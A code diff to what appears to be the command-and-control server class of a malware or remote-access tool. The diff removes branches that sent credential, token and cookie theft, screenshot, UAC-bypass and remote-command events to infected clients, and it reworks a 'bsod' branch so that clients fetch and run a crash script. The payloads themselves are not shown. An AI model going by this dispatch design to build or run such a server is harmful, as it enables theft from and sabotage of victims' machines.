@@ -107,39 +107,21 @@ class C2:
 
         return ip_addresses
 
+
+
+
     def explotation_module(self, data):
         explotation_module_type = data['explotation_module']
         uuids = data['uuids']
 
         for uuid in uuids:
-            if explotation_module_type == "steal-token":
-                for uuid in uuids:
-                    self.sio.emit('steal-token', {"uuid": uuid})
-
-            if explotation_module_type == "steal-password":
-                for uuid in uuids:
-                    self.sio.emit('steal-password', {"uuid": uuid})
-
-            if explotation_module_type == "steal-cookie":
-                for uuid in uuids:
-                    self.sio.emit('steal-cookie', {"uuid": uuid})
-                
             if explotation_module_type == "bsod":
                 for uuid in uuids:
-                    self.sio.emit('bsod', {"uuid": uuid})
-            
-            if explotation_module_type == "screen-shot":
-                for uuid in uuids:
-                    self.sio.emit('screen-shot', {"uuid": uuid})
-            
-            if explotation_module_type == "uac-bypass":
-                for uuid in uuids:
-                    self.sio.emit('uac-bypass', {"uuid": uuid})
-            
-            if explotation_module_type == "send-command":
-                for uuid in uuids:
-                    self.sio.emit('send-command', {"uuid": uuid})
+                    self.sio.emit('pem', {"uuid": uuid, "url": 'client/bsod.py'})
 
+
+                    
+            
 
     def generate(self, generate):
         os_name = generate['os']
